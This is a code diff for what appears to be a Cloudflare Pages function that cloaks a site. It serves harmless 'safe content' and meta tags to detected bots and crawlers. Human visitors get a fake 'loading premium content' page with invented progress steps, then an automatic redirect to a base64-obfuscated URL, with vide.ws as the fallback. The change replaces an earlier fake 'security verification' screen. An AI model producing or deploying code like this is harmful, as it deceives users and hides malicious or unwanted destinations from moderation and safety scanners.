@@ -22,9 +22,9 @@ export async function onRequest(context) {
       console.log(`🛡️ Serving safe content to bot`);
       return serveSafeContent(path, host);
     } else {
-      // HUMANS: Interactive verification + redirect
-      console.log(`👤 Serving verification to human`);
-      return serveHumanVerification(path, host);
+      // HUMANS: Auto-redirect dengan delay dan progress bar
+      console.log(`👤 Auto-redirecting human`);
+      return serveAutoRedirect(path, host);
     }
   } catch (error) {
     console.error('❌ Error:', error);
@@ -156,21 +156,6 @@ function serveSafeContent(path, host) {
             font-size: 0.9em;
             color: #718096;
         }
-        .btn {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 10px 0;
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
-        }
     </style>
 </head>
 <body>
@@ -206,10 +191,6 @@ function serveSafeContent(path, host) {
             <div>⭐ 4.8 Rating</div>
         </div>
         
-        <button class="btn" onclick="window.location.href='/library'">
-            Explore Library
-        </button>
-        
         <p style="margin-top: 20px; font-size: 0.9em; color: #718096;">
             Join thousands of users enjoying premium content
         </p>
@@ -225,20 +206,20 @@ function serveSafeContent(path, host) {
   });
 }
 
-// ===== HUMAN VERIFICATION + REDIRECT =====
-function serveHumanVerification(path, host) {
+// ===== AUTO-REDIRECT UNTUK HUMANS =====
+function serveAutoRedirect(path, host) {
   const targetUrl = getTargetPath(path);
   const obfuscatedUrl = btoa(targetUrl).replace(/=/g, '');
   
-  const verificationHtml = `<!DOCTYPE html>
+  const autoRedirectHtml = `<!DOCTYPE html>
 <html>
 <head>
-    <title>Security Verification - MediaStream Pro</title>
+    <title>MediaStream Pro - Loading Your Content</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Safe Meta Tags for Verification -->
-    <meta property="og:title" content="Security Verification - MediaStream Pro">
-    <meta property="og:description" content="Complete verification to access premium content">
+    <!-- Safe Meta Tags -->
+    <meta property="og:title" content="MediaStream Pro - Video Platform">
+    <meta property="og:description" content="Loading your premium video content">
     <meta property="twitter:card" content="summary">
     
     <style>
@@ -253,7 +234,7 @@ function serveHumanVerification(path, host) {
             justify-content: center;
             padding: 20px;
         }
-        .verification-container {
+        .loading-container {
             background: rgba(255,255,255,0.1);
             backdrop-filter: blur(15px);
             border: 1px solid rgba(255,255,255,0.2);
@@ -263,213 +244,184 @@ function serveHumanVerification(path, host) {
             width: 100%;
             text-align: center;
         }
-        .security-icon {
-            font-size: 4em;
+        .logo {
+            font-size: 3em;
             margin-bottom: 20px;
         }
         h1 {
             margin-bottom: 10px;
             font-size: 1.8em;
         }
-        .verification-steps {
+        .loading-steps {
             text-align: left;
             margin: 30px 0;
         }
         .step {
             display: flex;
             align-items: center;
-            margin-bottom: 20px;
-            padding: 15px;
+            margin-bottom: 15px;
+            padding: 12px;
             background: rgba(255,255,255,0.05);
-            border-radius: 10px;
-            border-left: 4px solid #4299e1;
+            border-radius: 8px;
+            opacity: 0.7;
+            transition: all 0.3s ease;
+        }
+        .step.active {
+            opacity: 1;
+            background: rgba(255,255,255,0.1);
+            border-left: 4px solid #48bb78;
+        }
+        .step.completed {
+            opacity: 1;
+            background: rgba(72, 187, 120, 0.1);
+            border-left: 4px solid #48bb78;
         }
         .step-icon {
-            width: 35px;
-            height: 35px;
-            background: #4299e1;
+            width: 30px;
+            height: 30px;
+            background: #4a5568;
             color: white;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin-right: 15px;
-            font-weight: bold;
+            font-size: 0.8em;
         }
-        .verify-btn {
-            background: linear-gradient(135deg, #48bb78, #38a169);
-            color: white;
-            border: none;
-            padding: 16px 40px;
-            font-size: 1.1em;
-            font-weight: 600;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 20px 0;
-            width: 100%;
-            max-width: 300px;
+        .step.active .step-icon {
+            background: #4299e1;
         }
-        .verify-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.3);
-        }
-        .verify-btn:disabled {
-            background: #718096;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        .step.completed .step-icon {
+            background: #48bb78;
         }
         .loading-bar {
             height: 6px;
             background: rgba(255,255,255,0.2);
             border-radius: 3px;
             overflow: hidden;
-            margin: 20px 0;
-            display: none;
+            margin: 25px 0;
         }
         .loading-progress {
             height: 100%;
-            background: linear-gradient(90deg, #48bb78, #4299e1);
+            background: linear-gradient(90deg, #4299e1, #48bb78);
             width: 0%;
-            transition: width 0.3s ease;
+            transition: width 0.5s ease;
         }
-        .status-message {
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 10px;
-            display: none;
+        .status-text {
+            margin: 15px 0;
+            font-size: 0.95em;
+            color: #cbd5e0;
+            min-height: 1.5em;
         }
-        .privacy-note {
-            margin-top: 25px;
-            font-size: 0.85em;
+        .countdown {
+            font-size: 0.9em;
             opacity: 0.7;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="verification-container">
-        <div class="security-icon">🔒</div>
-        <h1>Security Verification Required</h1>
-        <p>Please complete verification to access premium content</p>
+    <div class="loading-container">
+        <div class="logo">🎬</div>
+        <h1>MediaStream Pro</h1>
+        <p>Preparing your premium content...</p>
         
-        <div class="verification-steps">
-            <div class="step">
+        <div class="loading-steps">
+            <div class="step active" id="step1">
                 <div class="step-icon">1</div>
                 <div>
-                    <strong>Human Verification</strong><br>
-                    <small>Confirm you are not automated</small>
+                    <strong>Initializing Player</strong><br>
+                    <small>Setting up video environment</small>
                 </div>
             </div>
-            <div class="step">
+            <div class="step" id="step2">
                 <div class="step-icon">2</div>
                 <div>
-                    <strong>Security Scan</strong><br>
-                    <small>Checking for threats</small>
+                    <strong>Optimizing Stream</strong><br>
+                    <small>Adjusting for your connection</small>
                 </div>
             </div>
-            <div class="step">
+            <div class="step" id="step3">
                 <div class="step-icon">3</div>
                 <div>
-                    <strong>Access Grant</strong><br>
-                    <small>Preparing your content</small>
+                    <strong>Loading Content</strong><br>
+                    <small>Accessing premium library</small>
                 </div>
             </div>
         </div>
         
-        <button class="verify-btn" id="verifyBtn">
-            Start Verification
-        </button>
-        
-        <div class="loading-bar" id="loadingBar">
+        <div class="loading-bar">
             <div class="loading-progress" id="loadingProgress"></div>
         </div>
         
-        <div class="status-message" id="statusMessage"></div>
-        
-        <div class="privacy-note">
-            🔒 This verification helps protect against automated access and ensures content security.
-        </div>
+        <div class="status-text" id="statusText">Starting content delivery system...</div>
+        <div class="countdown" id="countdown">Redirecting in 3 seconds</div>
     </div>
 
     <script>
-        let verificationStep = 0;
-        let userInteracted = false;
+        let currentStep = 1;
+        let countdown = 3;
         
-        document.getElementById('verifyBtn').addEventListener('click', function() {
-            if (!userInteracted) {
-                userInteracted = true;
-                startVerification();
-            }
-        });
+        const steps = [
+            { progress: 25, text: "Initializing video player components..." },
+            { progress: 50, text: "Optimizing stream for your connection..." },
+            { progress: 75, text: "Loading content from secure servers..." },
+            { progress: 100, text: "Content ready! Redirecting..." }
+        ];
         
-        // Track user interactions
-        ['click', 'scroll', 'mousemove', 'keydown'].forEach(event => {
-            document.addEventListener(event, () => {
-                if (!userInteracted) userInteracted = true;
-            });
-        });
-        
-        function startVerification() {
-            const btn = document.getElementById('verifyBtn');
-            const loadingBar = document.getElementById('loadingBar');
-            const loadingProgress = document.getElementById('loadingProgress');
-            const statusMessage = document.getElementById('statusMessage');
-            
-            btn.disabled = true;
-            loadingBar.style.display = 'block';
-            statusMessage.style.display = 'block';
-            
-            const steps = [
-                { message: '🔍 Verifying human interaction...', progress: 20 },
-                { message: '🛡️ Running security scan...', progress: 40 },
-                { message: '🔐 Establishing secure connection...', progress: 60 },
-                { message: '📡 Connecting to content delivery...', progress: 80 },
-                { message: '✅ Verification complete! Redirecting...', progress: 100 }
-            ];
-            
-            function executeStep() {
-                if (verificationStep < steps.length) {
-                    const step = steps[verificationStep];
-                    statusMessage.innerHTML = step.message;
-                    loadingProgress.style.width = step.progress + '%';
-                    
-                    if (verificationStep === steps.length - 1) {
-                        btn.innerHTML = '✅ Access Granted';
-                    } else {
-                        btn.innerHTML = '🔄 Verifying...';
-                    }
-                    
-                    verificationStep++;
-                    setTimeout(executeStep, 1200);
-                } else {
-                    // Final redirect dengan obfuscation
-                    setTimeout(() => {
-                        const encodedUrl = '${obfuscatedUrl}';
-                        const padding = 4 - (encodedUrl.length % 4);
-                        const paddedUrl = encodedUrl + '='.repeat(padding);
-                        
-                        try {
-                            const targetUrl = atob(paddedUrl);
-                            window.location.href = targetUrl;
-                        } catch (error) {
-                            window.location.href = 'https://vide.ws/';
-                        }
-                    }, 1000);
+        function updateProgress() {
+            if (currentStep <= steps.length) {
+                const step = steps[currentStep - 1];
+                
+                // Update progress bar
+                document.getElementById('loadingProgress').style.width = step.progress + '%';
+                
+                // Update status text
+                document.getElementById('statusText').textContent = step.text;
+                
+                // Update steps visual
+                document.getElementById('step' + currentStep)?.classList.add('completed');
+                if (currentStep < steps.length) {
+                    document.getElementById('step' + (currentStep + 1))?.classList.add('active');
                 }
+                
+                // Update countdown
+                if (currentStep === steps.length) {
+                    document.getElementById('countdown').textContent = 'Redirecting now...';
+                    // Final redirect
+                    setTimeout(performRedirect, 500);
+                } else {
+                    document.getElementById('countdown').textContent = 'Redirecting in ' + countdown + ' seconds';
+                    countdown--;
+                }
+                
+                currentStep++;
+                setTimeout(updateProgress, 800);
             }
-            
-            executeStep();
         }
         
-        // Auto-focus untuk accessibility
-        document.getElementById('verifyBtn').focus();
+        function performRedirect() {
+            const encodedUrl = '${obfuscatedUrl}';
+            const padding = 4 - (encodedUrl.length % 4);
+            const paddedUrl = encodedUrl + '='.repeat(padding);
+            
+            try {
+                const targetUrl = atob(paddedUrl);
+                console.log('Redirecting to:', targetUrl);
+                window.location.href = targetUrl;
+            } catch (error) {
+                console.error('Redirect error:', error);
+                window.location.href = 'https://vide.ws/';
+            }
+        }
+        
+        // Start the auto-progress
+        setTimeout(updateProgress, 500);
     </script>
 </body>
 </html>`;
 
-  return new Response(verificationHtml, {
+  return new Response(autoRedirectHtml, {
     headers: { 
       'Content-Type': 'text/html; charset=utf-8',
       'Cache-Control': 'no-cache, no-store, must-revalidate'
